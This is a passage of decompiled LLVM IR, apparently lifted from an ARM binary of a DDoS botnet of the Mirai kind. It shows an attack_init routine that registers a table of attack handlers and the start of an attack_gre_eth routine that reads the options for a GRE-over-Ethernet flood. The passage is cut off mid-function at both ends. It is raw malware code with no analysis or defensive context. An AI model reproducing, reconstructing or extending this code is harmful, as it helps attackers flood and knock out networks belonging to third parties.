  uselistorder label %dec_label_pc_8484, { 1, 0 }
  uselistorder label %dec_label_pc_8320, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_85a0 = load i32, i32* @r4, align 4
  store i32 %v3_85a0, i32* %stack_var_-24, align 4
  %v6_85a0 = load i32, i32* @r5, align 4
  %v9_85a0 = load i32, i32* @r6, align 4
  %v12_85a0 = load i32, i32* @r7, align 4
  %v15_85a0 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_85ac = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_20f10.31 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_20f14.33 to i32), i32* @r6, align 4
  store i32 44700, i32* %r2.global-to-local, align 4
  store i32 %v2_85ac, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_20f11.37 to i32), i32* %r1.global-to-local, align 4
  %v2_85cc = load i32, i32* @global_var_20f14.33, align 4
  %v2_85d0 = inttoptr i32 %v2_85ac to i32*
  store i32 44700, i32* %v2_85d0, align 4
  %v3_85d4 = load i32, i32* @r4, align 4
  %v4_85d4 = add i32 %v3_85d4, 4
  %v5_85d4 = inttoptr i32 %v4_85d4 to i8*
  store i8 0, i8* %v5_85d4, align 1
  %v0_85d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_85d8 = mul i32 %v0_85d8, 4
  store i32 %v3_85d8, i32* %r1.global-to-local, align 4
  %v5_85dc = inttoptr i32 %v2_85cc to i32*
  %v6_85dc = call i32 @realloc(i32* %v5_85dc, i32 %v3_85d8, i32 44700, i32 0)
  %v2_85e0 = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_85e0 = zext i8 %v2_85e0 to i32
  store i32 %v6_85dc, i32* %r2.global-to-local, align 4
  %v0_85e8 = load i32, i32* @r4, align 4
  %v5_85e8 = mul nuw nsw i32 %v3_85e0, 4
  %v6_85e8 = add i32 %v5_85e8, %v6_85dc
  %v7_85e8 = inttoptr i32 %v6_85e8 to i32*
  store i32 %v0_85e8, i32* %v7_85e8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_20f11.37 to i32), i32* %r3.global-to-local, align 4
  %v1_85f8 = load i32, i32* @r6, align 4
  %v2_85f8 = inttoptr i32 %v1_85f8 to i32*
  store i32 %v6_85dc, i32* %v2_85f8, align 4
  %v0_85fc = load i32, i32* %r3.global-to-local, align 4
  %v1_85fc = trunc i32 %v0_85fc to i8
  %v2_85fc = load i32, i32* @r5, align 4
  %v3_85fc = inttoptr i32 %v2_85fc to i8*
  store i8 %v1_85fc, i8* %v3_85fc, align 1
  %v2_8600 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_b468.39 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  store i32 %v2_8600, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_20f11.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8618 = load i32, i32* @global_var_20f14.33, align 4
  %v2_861c = inttoptr i32 %v2_8600 to i32*
  store i32 ptrtoint (i32* @global_var_b468.39 to i32), i32* %v2_861c, align 4
  %v0_8620 = load i32, i32* @r7, align 4
  %v1_8620 = trunc i32 %v0_8620 to i8
  %v2_8620 = load i32, i32* @r4, align 4
  %v3_8620 = add i32 %v2_8620, 4
  %v4_8620 = inttoptr i32 %v3_8620 to i8*
  store i8 %v1_8620, i8* %v4_8620, align 1
  %v0_8624 = load i32, i32* %r1.global-to-local, align 4
  %v3_8624 = mul i32 %v0_8624, 4
  store i32 %v3_8624, i32* %r1.global-to-local, align 4
  %v4_8628 = inttoptr i32 %v2_8618 to i32*
  %v5_8628 = call i32 @realloc(i32* %v4_8628, i32 %v3_8624, i32 %v6_85dc, i32 ptrtoint (i32* @global_var_b468.39 to i32))
  %v2_862c = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_862c = zext i8 %v2_862c to i32
  store i32 %v3_862c, i32* %r3.global-to-local, align 4
  store i32 %v5_8628, i32* %r2.global-to-local, align 4
  %v0_8634 = load i32, i32* @r4, align 4
  %v5_8634 = mul nuw nsw i32 %v3_862c, 4
  %v6_8634 = add i32 %v5_8634, %v5_8628
  %v7_8634 = inttoptr i32 %v6_8634 to i32*
  store i32 %v0_8634, i32* %v7_8634, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_863c = load i32, i32* %r3.global-to-local, align 4
  %v1_863c = load i32, i32* @r7, align 4
  %v2_863c = add i32 %v1_863c, %v0_863c
  store i32 %v2_863c, i32* %r3.global-to-local, align 4
  %v1_8644 = trunc i32 %v2_863c to i8
  %v2_8644 = load i32, i32* @r5, align 4
  %v3_8644 = inttoptr i32 %v2_8644 to i8*
  store i8 %v1_8644, i8* %v3_8644, align 1
  %v0_8648 = load i32, i32* %r2.global-to-local, align 4
  %v1_8648 = load i32, i32* @r6, align 4
  %v2_8648 = inttoptr i32 %v1_8648 to i32*
  store i32 %v0_8648, i32* %v2_8648, align 4
  %v2_864c = call i32 @calloc(i32 %v1_863c, i32 8)
  %v2_8650 = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_8650 = zext i8 %v2_8650 to i32
  store i32 ptrtoint (i32* @global_var_b8d4.41 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_864c, i32* @r4, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_8660 = load i32, i32* @r7, align 4
  %v2_8660 = add i32 %v1_8660, %v3_8650
  store i32 %v2_8660, i32* %r1.global-to-local, align 4
  %v2_8664 = load i32, i32* @global_var_20f14.33, align 4
  %v2_8668 = inttoptr i32 %v2_864c to i32*
  store i32 ptrtoint (i32* @global_var_b8d4.41 to i32), i32* %v2_8668, align 4
  %v3_866c = load i32, i32* @r4, align 4
  %v4_866c = add i32 %v3_866c, 4
  %v5_866c = inttoptr i32 %v4_866c to i8*
  store i8 2, i8* %v5_866c, align 1
  %v0_8670 = load i32, i32* %r1.global-to-local, align 4
  %v3_8670 = mul i32 %v0_8670, 4
  store i32 %v3_8670, i32* %r1.global-to-local, align 4
  %v5_8674 = inttoptr i32 %v2_8664 to i32*
  %v6_8674 = call i32 @realloc(i32* %v5_8674, i32 %v3_8670, i32 ptrtoint (i32* @global_var_b8d4.41 to i32), i32 2)
  %v2_8678 = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_8678 = zext i8 %v2_8678 to i32
  store i32 %v3_8678, i32* %r3.global-to-local, align 4
  store i32 %v6_8674, i32* %r2.global-to-local, align 4
  %v0_8680 = load i32, i32* @r4, align 4
  %v5_8680 = mul nuw nsw i32 %v3_8678, 4
  %v6_8680 = add i32 %v5_8680, %v6_8674
  %v7_8680 = inttoptr i32 %v6_8680 to i32*
  store i32 %v0_8680, i32* %v7_8680, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8688 = load i32, i32* %r3.global-to-local, align 4
  %v1_8688 = load i32, i32* @r7, align 4
  %v2_8688 = add i32 %v1_8688, %v0_8688
  store i32 %v2_8688, i32* %r3.global-to-local, align 4
  %v1_8690 = load i32, i32* @r6, align 4
  %v2_8690 = inttoptr i32 %v1_8690 to i32*
  store i32 %v6_8674, i32* %v2_8690, align 4
  %v0_8694 = load i32, i32* %r3.global-to-local, align 4
  %v1_8694 = trunc i32 %v0_8694 to i8
  %v2_8694 = load i32, i32* @r5, align 4
  %v3_8694 = inttoptr i32 %v2_8694 to i8*
  store i8 %v1_8694, i8* %v3_8694, align 1
  %v2_8698 = call i32 @calloc(i32 %v1_8688, i32 8)
  %v2_869c = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_869c = zext i8 %v2_869c to i32
  store i32 ptrtoint (i32* @global_var_abdc.43 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r8, align 4
  store i32 %v2_8698, i32* @r4, align 4
  %v1_86ac = load i32, i32* @r7, align 4
  %v2_86ac = add i32 %v1_86ac, %v3_869c
  store i32 %v2_86ac, i32* %r1.global-to-local, align 4
  %v2_86b0 = load i32, i32* @global_var_20f14.33, align 4
  %v2_86b4 = inttoptr i32 %v2_8698 to i32*
  store i32 ptrtoint (i32* @global_var_abdc.43 to i32), i32* %v2_86b4, align 4
  %v0_86b8 = load i32, i32* @r8, align 4
  %v1_86b8 = trunc i32 %v0_86b8 to i8
  %v2_86b8 = load i32, i32* @r4, align 4
  %v3_86b8 = add i32 %v2_86b8, 4
  %v4_86b8 = inttoptr i32 %v3_86b8 to i8*
  store i8 %v1_86b8, i8* %v4_86b8, align 1
  %v0_86bc = load i32, i32* %r1.global-to-local, align 4
  %v3_86bc = mul i32 %v0_86bc, 4
  store i32 %v3_86bc, i32* %r1.global-to-local, align 4
  %v4_86c0 = inttoptr i32 %v2_86b0 to i32*
  %v5_86c0 = call i32 @realloc(i32* %v4_86c0, i32 %v3_86bc, i32 %v6_8674, i32 ptrtoint (i32* @global_var_abdc.43 to i32))
  %v2_86c4 = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_86c4 = zext i8 %v2_86c4 to i32
  store i32 %v3_86c4, i32* %r3.global-to-local, align 4
  store i32 %v5_86c0, i32* %r2.global-to-local, align 4
  %v0_86cc = load i32, i32* @r4, align 4
  %v5_86cc = mul nuw nsw i32 %v3_86c4, 4
  %v6_86cc = add i32 %v5_86cc, %v5_86c0
  %v7_86cc = inttoptr i32 %v6_86cc to i32*
  store i32 %v0_86cc, i32* %v7_86cc, align 4
  %v0_86d0 = load i32, i32* @r8, align 4
  store i32 %v0_86d0, i32* %r1.global-to-local, align 4
  %v0_86d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_86d4 = load i32, i32* @r7, align 4
  %v2_86d4 = add i32 %v1_86d4, %v0_86d4
  store i32 %v2_86d4, i32* %r3.global-to-local, align 4
  %v1_86dc = trunc i32 %v2_86d4 to i8
  %v2_86dc = load i32, i32* @r5, align 4
  %v3_86dc = inttoptr i32 %v2_86dc to i8*
  store i8 %v1_86dc, i8* %v3_86dc, align 1
  %v0_86e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r6, align 4
  %v2_86e0 = inttoptr i32 %v1_86e0 to i32*
  store i32 %v0_86e0, i32* %v2_86e0, align 4
  %v2_86e4 = call i32 @calloc(i32 %v1_86d4, i32 %v0_86d0)
  %v2_86e8 = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_86e8 = zext i8 %v2_86e8 to i32
  store i32 ptrtoint (i32* @global_var_a504.45 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86e4, i32* @r4, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_86f8 = load i32, i32* @r7, align 4
  %v2_86f8 = add i32 %v1_86f8, %v3_86e8
  store i32 %v2_86f8, i32* %r1.global-to-local, align 4
  %v2_86fc = load i32, i32* @global_var_20f14.33, align 4
  %v2_8700 = inttoptr i32 %v2_86e4 to i32*
  store i32 ptrtoint (i32* @global_var_a504.45 to i32), i32* %v2_8700, align 4
  %v3_8704 = load i32, i32* @r4, align 4
  %v4_8704 = add i32 %v3_8704, 4
  %v5_8704 = inttoptr i32 %v4_8704 to i8*
  store i8 3, i8* %v5_8704, align 1
  %v0_8708 = load i32, i32* %r1.global-to-local, align 4
  %v3_8708 = mul i32 %v0_8708, 4
  store i32 %v3_8708, i32* %r1.global-to-local, align 4
  %v5_870c = inttoptr i32 %v2_86fc to i32*
  %v6_870c = call i32 @realloc(i32* %v5_870c, i32 %v3_8708, i32 ptrtoint (i32* @global_var_a504.45 to i32), i32 3)
  %v2_8710 = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_8710 = zext i8 %v2_8710 to i32
  store i32 %v3_8710, i32* %r3.global-to-local, align 4
  store i32 %v6_870c, i32* %r2.global-to-local, align 4
  %v0_8718 = load i32, i32* @r4, align 4
  %v5_8718 = mul nuw nsw i32 %v3_8710, 4
  %v6_8718 = add i32 %v5_8718, %v6_870c
  %v7_8718 = inttoptr i32 %v6_8718 to i32*
  store i32 %v0_8718, i32* %v7_8718, align 4
  %v0_871c = load i32, i32* @r8, align 4
  store i32 %v0_871c, i32* %r1.global-to-local, align 4
  %v0_8720 = load i32, i32* %r3.global-to-local, align 4
  %v1_8720 = load i32, i32* @r7, align 4
  %v2_8720 = add i32 %v1_8720, %v0_8720
  store i32 %v2_8720, i32* %r3.global-to-local, align 4
  %v1_8728 = trunc i32 %v2_8720 to i8
  %v2_8728 = load i32, i32* @r5, align 4
  %v3_8728 = inttoptr i32 %v2_8728 to i8*
  store i8 %v1_8728, i8* %v3_8728, align 1
  %v0_872c = load i32, i32* %r2.global-to-local, align 4
  %v1_872c = load i32, i32* @r6, align 4
  %v2_872c = inttoptr i32 %v1_872c to i32*
  store i32 %v0_872c, i32* %v2_872c, align 4
  %v2_8730 = call i32 @calloc(i32 %v1_8720, i32 %v0_871c)
  %v2_8734 = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_8734 = zext i8 %v2_8734 to i32
  store i32 ptrtoint (i32* @global_var_9de0.47 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8730, i32* @r4, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_8744 = load i32, i32* @r7, align 4
  %v2_8744 = add i32 %v1_8744, %v3_8734
  store i32 %v2_8744, i32* %r1.global-to-local, align 4
  %v2_8748 = load i32, i32* @global_var_20f14.33, align 4
  %v2_874c = inttoptr i32 %v2_8730 to i32*
  store i32 ptrtoint (i32* @global_var_9de0.47 to i32), i32* %v2_874c, align 4
  %v3_8750 = load i32, i32* @r4, align 4
  %v4_8750 = add i32 %v3_8750, 4
  %v5_8750 = inttoptr i32 %v4_8750 to i8*
  store i8 4, i8* %v5_8750, align 1
  %v0_8754 = load i32, i32* %r1.global-to-local, align 4
  %v3_8754 = mul i32 %v0_8754, 4
  store i32 %v3_8754, i32* %r1.global-to-local, align 4
  %v5_8758 = inttoptr i32 %v2_8748 to i32*
  %v6_8758 = call i32 @realloc(i32* %v5_8758, i32 %v3_8754, i32 ptrtoint (i32* @global_var_9de0.47 to i32), i32 4)
  %v2_875c = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_875c = zext i8 %v2_875c to i32
  store i32 %v3_875c, i32* %r3.global-to-local, align 4
  store i32 %v6_8758, i32* %r2.global-to-local, align 4
  %v0_8764 = load i32, i32* @r4, align 4
  %v5_8764 = mul nuw nsw i32 %v3_875c, 4
  %v6_8764 = add i32 %v5_8764, %v6_8758
  %v7_8764 = inttoptr i32 %v6_8764 to i32*
  store i32 %v0_8764, i32* %v7_8764, align 4
  %v0_8768 = load i32, i32* @r8, align 4
  store i32 %v0_8768, i32* %r1.global-to-local, align 4
  %v0_876c = load i32, i32* %r3.global-to-local, align 4
  %v1_876c = load i32, i32* @r7, align 4
  %v2_876c = add i32 %v1_876c, %v0_876c
  store i32 %v2_876c, i32* %r3.global-to-local, align 4
  %v1_8774 = trunc i32 %v2_876c to i8
  %v2_8774 = load i32, i32* @r5, align 4
  %v3_8774 = inttoptr i32 %v2_8774 to i8*
  store i8 %v1_8774, i8* %v3_8774, align 1
  %v0_8778 = load i32, i32* %r2.global-to-local, align 4
  %v1_8778 = load i32, i32* @r6, align 4
  %v2_8778 = inttoptr i32 %v1_8778 to i32*
  store i32 %v0_8778, i32* %v2_8778, align 4
  %v2_877c = call i32 @calloc(i32 %v1_876c, i32 %v0_8768)
  %v2_8780 = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_8780 = zext i8 %v2_8780 to i32
  store i32 ptrtoint (i32* @global_var_95b4.49 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_877c, i32* @r4, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8790 = load i32, i32* @r7, align 4
  %v2_8790 = add i32 %v1_8790, %v3_8780
  store i32 %v2_8790, i32* %r1.global-to-local, align 4
  %v2_8794 = load i32, i32* @global_var_20f14.33, align 4
  %v2_8798 = inttoptr i32 %v2_877c to i32*
  store i32 ptrtoint (i32* @global_var_95b4.49 to i32), i32* %v2_8798, align 4
  %v3_879c = load i32, i32* @r4, align 4
  %v4_879c = add i32 %v3_879c, 4
  %v5_879c = inttoptr i32 %v4_879c to i8*
  store i8 5, i8* %v5_879c, align 1
  %v0_87a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_87a0 = mul i32 %v0_87a0, 4
  store i32 %v3_87a0, i32* %r1.global-to-local, align 4
  %v5_87a4 = inttoptr i32 %v2_8794 to i32*
  %v6_87a4 = call i32 @realloc(i32* %v5_87a4, i32 %v3_87a0, i32 ptrtoint (i32* @global_var_95b4.49 to i32), i32 5)
  %v2_87a8 = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_87a8 = zext i8 %v2_87a8 to i32
  store i32 %v3_87a8, i32* %r3.global-to-local, align 4
  store i32 %v6_87a4, i32* %r2.global-to-local, align 4
  %v0_87b0 = load i32, i32* @r4, align 4
  %v5_87b0 = mul nuw nsw i32 %v3_87a8, 4
  %v6_87b0 = add i32 %v5_87b0, %v6_87a4
  %v7_87b0 = inttoptr i32 %v6_87b0 to i32*
  store i32 %v0_87b0, i32* %v7_87b0, align 4
  %v0_87b4 = load i32, i32* @r8, align 4
  store i32 %v0_87b4, i32* %r1.global-to-local, align 4
  %v0_87b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_87b8 = load i32, i32* @r7, align 4
  %v2_87b8 = add i32 %v1_87b8, %v0_87b8
  store i32 %v2_87b8, i32* %r3.global-to-local, align 4
  %v1_87c0 = trunc i32 %v2_87b8 to i8
  %v2_87c0 = load i32, i32* @r5, align 4
  %v3_87c0 = inttoptr i32 %v2_87c0 to i8*
  store i8 %v1_87c0, i8* %v3_87c0, align 1
  %v0_87c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r6, align 4
  %v2_87c4 = inttoptr i32 %v1_87c4 to i32*
  store i32 %v0_87c4, i32* %v2_87c4, align 4
  %v2_87c8 = call i32 @calloc(i32 %v1_87b8, i32 %v0_87b4)
  %v2_87cc = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_87cc = zext i8 %v2_87cc to i32
  store i32 ptrtoint (i32* @global_var_8f54.51 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87c8, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_87dc = load i32, i32* @r7, align 4
  %v2_87dc = add i32 %v1_87dc, %v3_87cc
  store i32 %v2_87dc, i32* %r1.global-to-local, align 4
  %v2_87e0 = load i32, i32* @global_var_20f14.33, align 4
  %v2_87e4 = inttoptr i32 %v2_87c8 to i32*
  store i32 ptrtoint (i32* @global_var_8f54.51 to i32), i32* %v2_87e4, align 4
  %v3_87e8 = load i32, i32* @r4, align 4
  %v4_87e8 = add i32 %v3_87e8, 4
  %v5_87e8 = inttoptr i32 %v4_87e8 to i8*
  store i8 6, i8* %v5_87e8, align 1
  %v0_87ec = load i32, i32* %r1.global-to-local, align 4
  %v3_87ec = mul i32 %v0_87ec, 4
  store i32 %v3_87ec, i32* %r1.global-to-local, align 4
  %v5_87f0 = inttoptr i32 %v2_87e0 to i32*
  %v6_87f0 = call i32 @realloc(i32* %v5_87f0, i32 %v3_87ec, i32 ptrtoint (i32* @global_var_8f54.51 to i32), i32 6)
  %v2_87f4 = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_87f4 = zext i8 %v2_87f4 to i32
  store i32 %v3_87f4, i32* %r3.global-to-local, align 4
  store i32 %v6_87f0, i32* %r2.global-to-local, align 4
  %v0_87fc = load i32, i32* @r4, align 4
  %v5_87fc = mul nuw nsw i32 %v3_87f4, 4
  %v6_87fc = add i32 %v5_87fc, %v6_87f0
  %v7_87fc = inttoptr i32 %v6_87fc to i32*
  store i32 %v0_87fc, i32* %v7_87fc, align 4
  %v0_8800 = load i32, i32* @r8, align 4
  store i32 %v0_8800, i32* %r1.global-to-local, align 4
  %v0_8804 = load i32, i32* %r3.global-to-local, align 4
  %v1_8804 = load i32, i32* @r7, align 4
  %v2_8804 = add i32 %v1_8804, %v0_8804
  store i32 %v2_8804, i32* %r3.global-to-local, align 4
  %v1_880c = trunc i32 %v2_8804 to i8
  %v2_880c = load i32, i32* @r5, align 4
  %v3_880c = inttoptr i32 %v2_880c to i8*
  store i8 %v1_880c, i8* %v3_880c, align 1
  %v0_8810 = load i32, i32* %r2.global-to-local, align 4
  %v1_8810 = load i32, i32* @r6, align 4
  %v2_8810 = inttoptr i32 %v1_8810 to i32*
  store i32 %v0_8810, i32* %v2_8810, align 4
  %v2_8814 = call i32 @calloc(i32 %v1_8804, i32 %v0_8800)
  %v2_8818 = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_8818 = zext i8 %v2_8818 to i32
  store i32 ptrtoint (i32* @global_var_888c.53 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8814, i32* @r4, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_8828 = load i32, i32* @r7, align 4
  %v2_8828 = add i32 %v1_8828, %v3_8818
  store i32 %v2_8828, i32* %r1.global-to-local, align 4
  %v2_882c = load i32, i32* @global_var_20f14.33, align 4
  %v2_8830 = inttoptr i32 %v2_8814 to i32*
  store i32 ptrtoint (i32* @global_var_888c.53 to i32), i32* %v2_8830, align 4
  %v3_8834 = load i32, i32* @r4, align 4
  %v4_8834 = add i32 %v3_8834, 4
  %v5_8834 = inttoptr i32 %v4_8834 to i8*
  store i8 7, i8* %v5_8834, align 1
  %v0_8838 = load i32, i32* %r1.global-to-local, align 4
  %v3_8838 = mul i32 %v0_8838, 4
  store i32 %v3_8838, i32* %r1.global-to-local, align 4
  %v5_883c = inttoptr i32 %v2_882c to i32*
  %v6_883c = call i32 @realloc(i32* %v5_883c, i32 %v3_8838, i32 ptrtoint (i32* @global_var_888c.53 to i32), i32 7)
  %v2_8840 = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_8840 = zext i8 %v2_8840 to i32
  store i32 %v3_8840, i32* %r3.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v6_883c, i32* %v2_8844, align 4
  %v0_8848 = load i32, i32* @r4, align 4
  %v2_8848 = load i32, i32* %r3.global-to-local, align 4
  %v5_8848 = mul i32 %v2_8848, 4
  %v6_8848 = add i32 %v5_8848, %v6_883c
  %v7_8848 = inttoptr i32 %v6_8848 to i32*
  store i32 %v0_8848, i32* %v7_8848, align 4
  %v0_884c = load i32, i32* %r3.global-to-local, align 4
  %v1_884c = load i32, i32* @r7, align 4
  %v2_884c = add i32 %v1_884c, %v0_884c
  store i32 %v2_884c, i32* %r2.global-to-local, align 4
  %v1_8854 = trunc i32 %v2_884c to i8
  %v2_8854 = load i32, i32* @r5, align 4
  %v3_8854 = inttoptr i32 %v2_8854 to i8*
  store i8 %v1_8854, i8* %v3_8854, align 1
  %v2_8858 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8858, i32* @r4, align 4
  store i32 %v6_85a0, i32* @r5, align 4
  store i32 %v9_85a0, i32* @r6, align 4
  store i32 %v12_85a0, i32* @r7, align 4
  store i32 %v15_85a0, i32* @r8, align 4
  ret i32 %v1_884c

; uselistorder directives
  uselistorder i32 %v1_884c, { 1, 0 }
  uselistorder i32 %v3_8838, { 1, 0 }
  uselistorder i32 %v1_8804, { 1, 0 }
  uselistorder i32 %v3_87ec, { 1, 0 }
  uselistorder i32 %v1_87b8, { 1, 0 }
  uselistorder i32 %v3_87a0, { 1, 0 }
  uselistorder i32 %v1_876c, { 1, 0 }
  uselistorder i32 %v3_8754, { 1, 0 }
  uselistorder i32 %v1_8720, { 1, 0 }
  uselistorder i32 %v3_8708, { 1, 0 }
  uselistorder i32 %v1_86d4, { 1, 0 }
  uselistorder i32 %v3_86bc, { 1, 0 }
  uselistorder i32 %v1_8688, { 1, 0 }
  uselistorder i32 %v6_8674, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8670, { 1, 0 }
  uselistorder i32 %v1_863c, { 1, 0 }
  uselistorder i32 %v3_8624, { 1, 0 }
  uselistorder i32 %v2_8600, { 1, 0 }
  uselistorder i32 %v6_85dc, { 1, 2, 0, 3 }
  uselistorder i32 %v3_85d8, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_20f10.31 to i8*), { 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_20f11.37 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_20f10.31, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_20f10.31 to i32), { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_888c = load i32, i32* @r4, align 4
  %v24_888c = load i32, i32* @fp, align 4
  %v27_888c = load i32, i32* @lr, align 4
  store i32 0, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_88b8 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_88bc = load i32, i32* @r4, align 4
  store i32 %v0_88bc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @sb, align 4
  store i32 %v0_88c8, i32* %r3.global-to-local, align 4
  %v0_88cc = load i32, i32* @r5, align 4
  store i32 %v0_88cc, i32* %r0.global-to-local, align 4
  %v5_88d0 = inttoptr i32 %v0_88bc to i32*
  %v6_88d0 = call i32 @attack_get_opt_int(i32 %v0_88cc, i32* %v5_88d0, i32 2, i32 %v0_88c8, i32 %v2_88b8)
  %v1_88dc = urem i32 %v6_88d0, 256
  store i32 %v1_88dc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_88e8 = load i32, i32* @r4, align 4
  store i32 %v0_88e8, i32* %r1.global-to-local, align 4
  %v0_88ec = load i32, i32* @r5, align 4
  store i32 %v0_88ec, i32* %r0.global-to-local, align 4
  %v5_88f0 = trunc i32 %v6_88d0 to i8
  %v6_88f4 = inttoptr i32 %v0_88e8 to i32*
  %v7_88f4 = call i32 @attack_get_opt_int(i32 %v0_88ec, i32* %v6_88f4, i32 3, i32 65535, i32 %v6_88d0)
  %v0_88f8 = load i32, i32* @r4, align 4
  store i32 %v0_88f8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_88f4, i32* %fp.global-to-local, align 4
  %v0_8908 = load i32, i32* @r5, align 4
  store i32 %v0_8908, i32* %r0.global-to-local, align 4
  %v5_890c = inttoptr i32 %v0_88f8 to i32*
  %v6_890c = call i32 @attack_get_opt_int(i32 %v0_8908, i32* %v5_890c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_8914 = urem i32 %v6_890c, 256
  store i32 %v1_8914, i32* %ip.global-to-local, align 4
  %v0_8918 = load i32, i32* @r4, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8924 = load i32, i32* @r5, align 4
  store i32 %v0_8924, i32* %r0.global-to-local, align 4
  %v6_892c = inttoptr i32 %v0_8918 to i32*
  %v7_892c = call i32 @attack_get_opt_int(i32 %v0_8924, i32* %v6_892c, i32 5, i32 1, i32 %v1_8914)
  %v1_8938 = urem i32 %v7_892c, 256
  store i32 %v1_8938, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8944 = load i32, i32* @r4, align 4
  store i32 %v0_8944, i32* %r1.global-to-local, align 4
  %v0_8948 = load i32, i32* @r5, align 4
  store i32 %v0_8948, i32* %r0.global-to-local, align 4
  %v5_8950 = inttoptr i32 %v0_8944 to i32*
